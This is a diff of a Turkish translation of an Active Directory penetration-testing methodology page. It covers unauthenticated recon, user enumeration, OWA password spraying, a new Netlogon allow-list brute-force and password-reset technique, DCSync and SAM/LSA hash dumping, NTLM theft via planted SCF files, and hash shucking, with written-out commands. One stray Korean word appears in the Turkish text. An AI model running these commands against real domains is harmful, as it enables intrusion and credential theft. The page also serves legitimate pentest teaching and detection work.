@@ -2,57 +2,57 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Temel genel bakış
+## Basic overview
 
-**Active Directory**, **ağ yöneticilerinin** bir ağ içinde **domain**ler, **user**lar ve **object**ler oluşturup yönetmesini verimli şekilde sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **group**lar ve **subgroup**lar halinde düzenlemeyi kolaylaştırırken, farklı seviyelerde **access rights** kontrolü sağlar.
+**Active Directory**, **network administrators**ın ağ içinde **domains**, **users** ve **objects** oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **groups** ve **subgroups** içine organize etmeyi kolaylaştırırken, çeşitli seviyelerde **access rights** kontrolü sağlar.
 
-**Active Directory** yapısı üç ana katmandan oluşur: **domain**ler, **tree**ler ve **forest**lar. Bir **domain**, **user**lar veya **device**lar gibi, ortak bir veritabanını paylaşan object koleksiyonunu kapsar. **Tree**ler, ortak bir yapı ile birbirine bağlanan bu domain gruplarıdır ve bir **forest**, **trust relationships** ile birbirine bağlanan birden fazla tree koleksiyonunu temsil eder; organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **access** ve **communication rights** atanabilir.
+**Active Directory** yapısı üç ana katmandan oluşur: **domains**, **trees** ve **forests**. Bir **domain**, ortak bir veritabanını paylaşan **users** veya **devices** gibi nesnelerden oluşan bir koleksiyonu kapsar. **Trees**, ortak bir yapı ile birbirine bağlı bu domain gruplarıdır ve bir **forest**, **trust relationships** ile birbirine bağlanan birden fazla tree’nin koleksiyonunu temsil eder; bu da organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **access** ve **communication rights** tanımlanabilir.
 
-**Active Directory** içindeki temel kavramlar:
+**Active Directory** içindeki temel kavramlar şunlardır:
 
-1. **Directory** – Active Directory objectleriyle ilgili tüm bilgileri barındırır.
-2. **Object** – Directory içindeki varlıkları ifade eder; bunlara **user**lar, **group**lar veya **shared folder**lar dahildir.
-3. **Domain** – Directory objectleri için bir konteyner görevi görür; bir **forest** içinde birden fazla domain bir arada bulunabilir ve her biri kendi object koleksiyonunu korur.
-4. **Tree** – Ortak bir root domain paylaşan domain gruplaması.
-5. **Forest** – Active Directory’de organizasyon yapısının zirvesi; aralarında **trust relationships** bulunan birkaç tree’den oluşur.
+1. **Directory** – Active Directory nesnelerine ilişkin tüm bilgileri barındırır.
+2. **Object** – Dizindeki varlıkları ifade eder; bunlara **users**, **groups** veya **shared folders** dahildir.
+3. **Domain** – Directory nesneleri için bir kapsayıcı görevi görür; bir **forest** içinde birden fazla domain bir arada bulunabilir ve her biri kendi nesne koleksiyonunu korur.
+4. **Tree** – Ortak bir root domain paylaşan domain gruplandırmasıdır.
+5. **Forest** – Active Directory’de organizasyon yapısının zirvesidir; aralarında **trust relationships** bulunan birkaç tree’den oluşur.
 
 **Active Directory Domain Services (AD DS)**, bir ağ içinde merkezi yönetim ve iletişim için kritik olan bir dizi hizmeti kapsar. Bu hizmetler şunları içerir:
 
-1. **Domain Services** – Veri depolamayı merkezileştirir ve **user**lar ile **domain**ler arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri dahildir.
-2. **Certificate Services** – Güvenli **digital certificate**ların oluşturulmasını, dağıtımını ve yönetimini denetler.
+1. **Domain Services** – Veri depolamayı merkezileştirir ve **users** ile **domains** arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri dahildir.
+2. **Certificate Services** – Güvenli **digital certificates** oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
 3. **Lightweight Directory Services** – **LDAP protocol** üzerinden directory-enabled uygulamaları destekler.
-4. **Directory Federation Services** – Kullanıcıların bir oturumda birden fazla web application arasında kimliğini doğrulamak için **single-sign-on** yetenekleri sağlar.
-5. **Rights Management** – Telif hakkı materyallerini yetkisiz dağıtım ve kullanıma karşı düzenleyerek korumaya yardımcı olur.
-6. **DNS Service** – **domain name**lerin çözümlemesi için kritik öneme sahiptir.
+4. **Directory Federation Services** – Kullanıcıları tek bir oturumda birden fazla web uygulaması arasında doğrulamak için **single-sign-on** yetenekleri sağlar.
+5. **Rights Management** – Telifli materyalin yetkisiz dağıtımını ve kullanımını düzenleyerek korunmasına yardımcı olur.
+6. **DNS Service** – **domain names** çözümlemesi için kritiktir.
 
-Daha ayrıntılı açıklama için bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)
+Daha ayrıntılı açıklama için şuraya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)
 
 ### **Kerberos Authentication**
 
-Bir **AD**ye nasıl **attack** edileceğini öğrenmek için **Kerberos authentication process**i gerçekten iyi **understand** etmeniz gerekir.\
-[**How it works bilmediyseniz bu sayfayı okuyun.**](kerberos-authentication.md)
+**Bir AD’ye saldırmayı** öğrenmek için **Kerberos authentication process**’i gerçekten iyi **anlamak** gerekir.\
+[**Hâlâ nasıl çalıştığını bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)
 
 ## Cheat Sheet
 
-AD’yi enumerate/exploit etmek için çalıştırabileceğiniz komutlara hızlıca göz atmak adına [https://wadcoms.github.io/](https://wadcoms.github.io)’ya çok şey bakabilirsiniz.
+AD’yi enumerate/exploit etmek için çalıştırabileceğiniz komutları hızlıca görmek adına [https://wadcoms.github.io/](https://wadcoms.github.io) adresine göz atabilirsiniz.
 
 > [!WARNING]
-> Kerberos iletişimi, işlem gerçekleştirmek için **tam nitelikli ad (FQDN)** gerektirir. Bir makineye IP adresiyle erişmeye çalışırsanız, **NTLM kullanır ve kerberos kullanmaz**.
+> Kerberos communication, işlem yapmak için **tam nitelikli ad (FQDN)** gerektirir. Eğer bir makineye IP adresiyle erişmeye çalışırsanız, **NTLM kullanır ve kerberos kullanmaz**.
 
 ## Recon Active Directory (No creds/sessions)
 
-Eğer bir AD ortamına erişiminiz varsa ama herhangi bir credentials/sessionınız yoksa şunları yapabilirsiniz:
+Eğer bir AD ortamına erişiminiz varsa ama hiçbir credentials/sessions yoksa şunları yapabilirsiniz:
 
 - **Pentest the network:**
-- Ağı tarayın, makineleri ve açık portları bulun ve **vulnerabilities**’leri **exploit** etmeye veya onlardan **credentials** çıkarmaya çalışın (örneğin, [printers could be very interesting targets](ad-information-in-printers.md).
-- DNS’i enumerate etmek, domain içindeki web, printer, share, vpn, media vb. önemli serverlar hakkında bilgi verebilir.
+- Ağı tarayın, makineleri ve açık portları bulun ve **vulnerabilities** exploit etmeye veya bunlardan **credentials** çıkarmaya çalışın (örneğin, [printers could be very interesting targets](ad-information-in-printers.md)).
+- DNS enumerate etmek, domain içindeki web, printers, shares, vpn, media vb. kritik server’lar hakkında bilgi verebilir.
 - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
-- Bunun nasıl yapılacağı hakkında daha fazla bilgi için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)’ye bakın.
-- **smb services üzerinde null ve Guest access olup olmadığını kontrol edin** (bu modern Windows sürümlerinde çalışmaz):
+- Bunu nasıl yapacağınıza dair daha fazla bilgi için genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) bölümüne bakın.
+- **SMB servislerinde null ve Guest access kontrolü yapın** (bu, modern Windows sürümlerinde çalışmaz):
 - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
 - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
 - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
-- Bir SMB server’ı nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir:
+- Bir SMB server’ını nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir:
 
 
 {{#ref}}
@@ -61,20 +61,20 @@ Eğer bir AD ortamına erişiminiz varsa ama herhangi bir credentials/sessionın
 
 - **Ldap enumerate edin**
 - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
-- LDAP’i nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir (özellikle **anonymous access**’e dikkat edin):
+- LDAP’yi nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir (özellikle **anonymous access**’e dikkat edin):
 
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-ldap.md
 {{#endref}}
 
-- **Ağı poison edin**
-- [**Responder ile servisleri impersonating ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials toplayın
-- [**relay attack**’i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host’a erişin
-- [**evil-S** ile sahte UPnP service’ler açarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) üzerinden credentials toplayın
+- **Ağ poisoning yapın**
+- [**Responder ile servisleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials toplayın
+- [**relay attack’i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host’a erişin
+- [**evil-S** ile sahte UPnP servisleri**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) açığa çıkararak credentials toplayın
 - [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
-- Domain ortamlarındaki ve ayrıca herkese açık kaynaklardaki iç document’lerden, social media’dan, service’lerden (özellikle web) username/name çıkarın.
-- Şirket çalışanlarının tam isimlerini bulursanız, farklı AD **username convention**’larını deneyebilirsiniz (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın convention’lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random harf ve 3 random number_ (abc123).
+- Domain ortamları içinde ve ayrıca herkese açık kaynaklarda yer alan internal documents, social media, services (özellikle web) içinden usernames/names çıkarın.
+- Şirket çalışanlarının tam adlarını bulursanız, farklı AD **username conventions (**[**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) denemeyi düşünebilirsiniz. En yaygın convention’lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
 - Tools:
 - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
 - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)
@@ -82,8 +82,8 @@ Eğer bir AD ortamına erişiminiz varsa ama herhangi bir credentials/sessionın
 ### User enumeration
 
 - **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
-- **Kerbrute enum**: **invalid username** istendiğinde server, **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu da username’in geçersiz olduğunu anlamamızı sağlar. **Valid usernames** ise ya bir **AS-REP** yanıtında **TGT**’yi ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür; bu da kullanıcının pre-authentication yapmasının gerektiğini gösterir.
-- **MS-NRPC’ye karşı Authentication yok**: Domain controller’lardaki MS-NRPC (Netlogon) interface’ine karşı auth-level = 1 (No authentication) kullanılır. Yöntem, MS-NRPC interface’e bağlandıktan sonra `DsrGetDcNameEx2` fonksiyonunu çağırır ve herhangi bir credentials olmadan user veya computer’ın var olup olmadığını kontrol eder. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür enumeration’ı uygular. Araştırma [burada](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) bulunabilir
+- **Kerbrute enum**: Bir **invalid username** istendiğinde server, **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu da username’in geçersiz olduğunu anlamamızı sağlar. **Valid usernames** ise ya **AS-REP** yanıtında **TGT**’yi ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür; bu da kullanıcının pre-authentication yapması gerektiğini gösterir.
+- **MS-NRPC’ye karşı Authentication yok**: Domain controller’larda MS-NRPC (Netlogon) interface’ine karşı auth-level = 1 (No authentication) kullanımı. Bu yöntem, kimlik bilgisi olmadan kullanıcının veya bilgisayarın var olup olmadığını kontrol etmek için MS-NRPC interface’ine bağlandıktan sonra `DsrGetDcNameEx2` fonksiyonunu çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool’u bu tür enumerate işlemini uygular. Araştırma [burada](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) bulunabilir.
 ```bash
 ./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
 
@@ -97,7 +97,7 @@ python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/Nau
 ```
 - **OWA (Outlook Web Access) Sunucusu**
 
-Ağda bu sunuculardan birini bulduysanız, buna karşı **kullanıcı numaralandırması** da yapabilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
+Eğer ağda bu sunuculardan birini bulduysanız, buna karşı **kullanıcı enumerasyonu** da yapabilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
 ```bash
 ipmo C:\Tools\MailSniper\MailSniper.ps1
 # Get info about the domain
@@ -110,17 +110,55 @@ Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summe
 Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
 ```
 > [!WARNING]
-> Kullanıcı adlarının listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bunu ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) içinde bulabilirsiniz.
+> Kullanıcı adları listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bunu da ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) içinde bulabilirsiniz.
 >
-> Ancak, bundan önce yapmış olmanız gereken recon adımından, şirkette çalışan **kişilerin adlarına** sahip olmalısınız. Ad ve soyad ile potansiyel geçerli kullanıcı adları üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) scriptini kullanabilirsiniz.
+> Ancak, bundan önce yapmış olmanız gereken recon adımından şirket içinde çalışan kişilerin **adına** sahip olmalısınız. Ad ve soyad ile, olası geçerli kullanıcı adlarını üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.
 
-### Bir veya birkaç kullanıcı adını bilmek
+### Netlogon vulnerable-channel allow-list abuse (Onelogon)
 
-Tamam, artık geçerli bir kullanıcı adınız var ama parola yok... O zaman deneyin:
+**Zerologon** DC üzerinde patch'lense bile, açıkça allow-list'e alınmış hesaplar yine de **legacy/vulnerable Netlogon secure-channel davranışına** maruz kalabilir. Riskli konfigürasyon, GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** veya eşleşen registry değeri **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**'tir.
 
-- [**ASREPRoast**](asreproast.md): Eğer bir kullanıcının _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o kullanıcı için içinde kullanıcının parolasının bir derivasyonu ile şifrelenmiş bazı veriler bulunan bir **AS_REP message** isteyebilirsiniz.
-- [**Password Spraying**](password-spraying.md): Bulunan her kullanıcıyla en **yaygın parolaları** deneyelim; belki bir kullanıcı kötü bir parola kullanıyordur (parola politikasını unutmayın!).
-- Ayrıca kullanıcıların posta sunucularına erişim elde etmeye çalışmak için **OWA servers** üzerinde de **spray** yapabileceğinizi unutmayın.
+Bu değer bir **SDDL security descriptor**'dır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE verilen herhangi bir hesap veya grup hedeflenebilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` etkili olarak **Everyone**'ı allow-list'e alır.
+
+Pratik operator iş akışı:
+
+1. **SYSVOL/GPO** ve **canlı DC registry**'sini kontrol ederek allow-list'e alınmış principal'ları belirleyin.
+2. SDDL içinde bulunan **SID**'leri gerçek AD user/computer'lara eşleyin ve **DC machine accounts**, **trust accounts** ve diğer ayrıcalıklı makineleri önceliklendirin.
+3. Allow-list'e alınmış hesap olarak tekrar tekrar **MS-NRPC / Netlogon authentication** denemesi yapın.
+4. Başarılı bir tahminden sonra, hedef hesap parolasını sıfırlamak için **Netlogon password-setting** istismar edin (public PoC bunu boş string olarak ayarlar).
+
+Public artifact'tan hızlı triage / lab örnekleri:
+```bash
+# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
+poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>
+
+# Meet-in-the-middle attack against an allow-listed account
+poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'
+
+# Faster 24-bit brute force when you control another computer account
+poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
+--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
+```
+Notlar:
+
+- **scanner** faydalıdır çünkü etkili allow-list **SYSVOL** içinde, **registry** içinde veya her ikisinde de bulunabilir.
+- Exploit yolu 자체 önemlidir çünkü savunmasız bir hesap tanımlandıktan sonra **Domain Admin privileges** gerektirmez.
+- `DC$` gibi bir **Domain Controller machine account** ele geçirmek özellikle tehlikelidir çünkü bu parolanın sıfırlanması doğrudan daha geniş **AD takeover** yollarını etkinleştirebilir.
+- **Brute-force feasibility** moda bağlıdır: public artifact bir meet-in-the-middle yaklaşımını, başka bir computer account mevcutken **24-bit** brute force’u ve daha yavaş **32-bit** varyantları tanımlar.
+
+Detection / hardening notları:
+
+- Allow-list policy’yi denetleyin ve geçici, açıkça gerekli compatibility exception’lar dışında her şeyi kaldırın.
+- DC **System** event’leri **5827/5828/5829/5830/5831**’i izleyerek savunmasız Netlogon bağlantılarının policy tarafından reddedildiğini, keşfedildiğini veya açıkça izin verildiğini yakalayın.
+- `VulnerableChannelAllowList` içindeki hesapları, legacy dependency kaldırılana kadar **high-risk** olarak değerlendirin.
+
+### Bir veya birkaç username bilmek
+
+Tamam, elinizde zaten geçerli bir username var ama password yok... O zaman deneyin:
+
+- [**ASREPRoast**](asreproast.md): Bir user’ın _DONT_REQ_PREAUTH_ attribute’u **yoksa**, o user için password’un bir türeviyle şifrelenmiş bazı data içeren bir **AS_REP message** isteyebilirsiniz.
+- [**Password Spraying**](password-spraying.md): Bulunan her user ile en **common passwords**’leri deneyelim; belki bir user kötü bir password kullanıyordur (password policy’yi unutmayın!).
+- Ayrıca kullanıcıların mail server’larına erişim elde etmek için **OWA servers** üzerinde de **spray** yapabileceğinizi unutmayın.
 
 
 {{#ref}}
@@ -129,7 +167,7 @@ password-spraying.md
 
 ### LLMNR/NBT-NS Poisoning
 
-Ağdaki bazı protokolleri **poisoning** yaparak bazı challenge **hashes** elde etmeyi başarabilirsiniz:
+Ağdaki bazı protokolleri **poisoning** yaparak kırmak için bazı challenge **hashes** **obtain** edebilirsiniz:
 
 
 {{#ref}}
@@ -138,23 +176,23 @@ Ağdaki bazı protokolleri **poisoning** yaparak bazı challenge **hashes** elde
 
 ### NTLM Relay
 
-Active Directory'yi enumerate etmeyi başardıysanız, **daha fazla email** ve **ağın daha iyi bir anlayışına** sahip olursunuz. AD ortamına erişim elde etmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayabilirsiniz.
+Active Directory’yi enumerate etmeyi başardıysanız, **daha fazla email** ve **network** hakkında daha iyi bir anlayışa sahip olursunuz. AD ortamına erişim elde etmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlamayı deneyebilirsiniz.
 
 ### NetExec workspace-driven recon & relay posture checks
 
-- Engagment başına AD recon durumunu saklamak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protokole göre SQLite DB'ler oluşturur (smb/mssql/winrm/ldap/etc). Görünümler arasında `proto smb|mssql|winrm` ile geçiş yapın ve toplanan secret'ları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri manuel olarak temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
-- **`netexec smb <cidr>`** ile hızlı subnet keşfi, **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini ortaya çıkarır. `(signing:False)` gösteren üyeler **relay-prone**'dur, DC'ler ise çoğu zaman signing gerektirir.
-- Hedeflemeyi kolaylaştırmak için **`/etc/hosts`** içindeki **hostnames**'leri doğrudan NetExec çıktısından oluşturun:
+- AD recon durumunu her engagement için ayrı tutmak üzere **`nxcdb` workspaces** kullanın: `workspace create <name>` komutu `~/.nxc/workspaces/<name>` altında protokol başına SQLite DB’ler oluşturur (smb/mssql/winrm/ldap/etc). Görünümler arasında `proto smb|mssql|winrm` ile geçiş yapın ve toplanan secrets’ları `creds` ile listeleyin. İşiniz bitince sensitive data’yı manuel olarak temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
+- **`netexec smb <cidr>`** ile hızlı subnet discovery, **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren member’lar **relay-prone**’dur, DC’ler ise çoğu zaman signing gerektirir.
+- Target etmeyi kolaylaştırmak için NetExec çıktısından doğrudan **/etc/hosts** içine **hostnames** üretin:
 ```bash
 netexec smb 10.2.10.0/24 --generate-hosts-file hosts
 cat hosts /etc/hosts | sponge /etc/hosts
 ```
-- **SMB relay to the DC signing ile engellendiğinde** bile **LDAP** durumunu kontrol edin: `netexec ldap <dc>` `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing zorunlu ama LDAP signing devre dışı olan bir DC, **SPN-less RBCD** gibi abuses için hâlâ geçerli bir **relay-to-LDAP** hedefidir.
+- **SMB relay to DC signing tarafından engellendiğinde** bile **LDAP** durumunu kontrol et: `netexec ldap <dc>` `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing required ama LDAP signing disabled olan bir DC, **SPN-less RBCD** gibi kötüye kullanımlar için hâlâ uygun bir **relay-to-LDAP** hedefidir.
 
 ### Client-side printer credential leaks → bulk domain credential validation
 
-- Printer/web UIs bazen HTML içinde **maskelenmiş admin passwords** gömer. Kaynak/devtools görüntülemek cleartext’i açığa çıkarabilir (ör. `<input value="<password>">`), bu da scan/print repositories’e erişmek için Basic-auth kullanmayı sağlar.
-- Alınan print jobs, kullanıcı başına passwords içeren **plaintext onboarding docs** barındırabilir. Test ederken eşleştirmeleri uyumlu tutun:
+- Printer/web UIs bazen **maskelenmiş admin şifrelerini HTML içine gömer**. Kaynak/devtools görüntülemek cleartext’i açığa çıkarabilir (ör. `<input value="<password>">`), bu da scan/print repositories’ye Basic-auth erişimi sağlar.
+- Alınan print jobs, kullanıcı başına şifreler içeren **plaintext onboarding docs** içerebilir. Test ederken eşleşmeleri hizalı tut:
 ```bash
 cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
 cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
@@ -162,7 +200,7 @@ netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
 ```
 ### Steal NTLM Creds
 
-If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:
+Eğer **null veya guest user** ile **diğer PC’lere veya shares** erişebiliyorsanız, **dosyalar** (örneğin bir SCF dosyası) yerleştirebilirsiniz; bunlara bir şekilde erişilirse **size karşı bir NTLM authentication tetiklenir**, böylece **NTLM challenge**’ını **steal** edip crack edebilirsiniz:
 
 
 {{#ref}}
@@ -171,36 +209,36 @@ If you can **access other PCs or shares** with the **null or guest user** you co
 
 ### Hash Shucking & NT-Candidate Attacks
 
-**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.
+**Hash shucking**, sahip olduğunuz her NT hash’i, anahtar materyali doğrudan NT hash’ten türetilen diğer, daha yavaş formatlar için bir aday parola olarak ele alır. Kerberos RC4 tickets, NetNTLM challenges veya cached credentials üzerinde uzun passphrase’leri brute-force etmek yerine, NT hash’leri Hashcat’in NT-candidate modlarına verirsiniz ve düz metni hiç öğrenmeden password reuse olup olmadığını doğrulatırsınız. Bu, özellikle domain compromise sonrasında binlerce güncel ve geçmiş NT hash toplayabildiğinizde çok etkilidir.
 
-Use shucking when:
+Shucking’i şu durumlarda kullanın:
 
-- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
-- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
-- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.
+- DCSync, SAM/SECURITY dumps veya credential vaults’ten bir NT corpus’unuz varsa ve diğer domain/forest’lerde reuse test etmek istiyorsanız.
+- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses veya DCC/DCC2 blobs yakalıyorsanız.
+- Uzun, crack edilemeyen passphrase’ler için reuse’u hızlıca kanıtlamak ve hemen Pass-the-Hash ile pivot yapmak istiyorsanız.
 
-The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.
+Bu teknik, anahtarları NT hash olmayan encryption types’a karşı çalışmaz (ör. Kerberos etype 17/18 AES). Domain yalnızca AES zorunlu kılıyorsa, normal password modlarına dönmeniz gerekir.
 
-#### Building an NT hash corpus
+#### Bir NT hash corpus’u oluşturma
 
-- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):
+- **DCSync/NTDS** – Mümkün olan en büyük NT hash kümesini (ve önceki değerlerini) almak için `secretsdump.py`’yi history ile kullanın:
 
 ```bash
 secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
 grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
 ```
 
-History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:
+History girdileri aday havuzunu ciddi şekilde genişletir çünkü Microsoft hesap başına 24 önceki hash saklayabilir. NTDS secrets toplamanın daha fazla yolu için bakın:
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
-- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
-- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.
+- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) local SAM/SECURITY verisini ve cached domain logons (DCC/DCC2) çıkarır. Bunları deduplicate edin ve aynı `nt_candidates.txt` listesine ekleyin.
+- **Metadata takibi** – Her hash’i üreten kullanıcı adını/domain’i saklayın (wordlist yalnızca hex içerse bile). Hashcat kazanan candidate’ı yazdığında, eşleşen hash size hangi principal’ın password reuse yaptığını hemen gösterir.
+- Aynı forest veya trusted forest içinden gelen adayları tercih edin; shucking sırasında overlap şansını maksimize eder.
 
-#### Hashcat NT-candidate modes
+#### Hashcat NT-candidate modları
 
 | Hash Type                                | Password Mode | NT-Candidate Mode |
 | ---------------------------------------- | ------------- | ----------------- |
@@ -212,16 +250,16 @@ dcsync.md
 | Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
 | Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |
 
-Notes:
+Notlar:
 
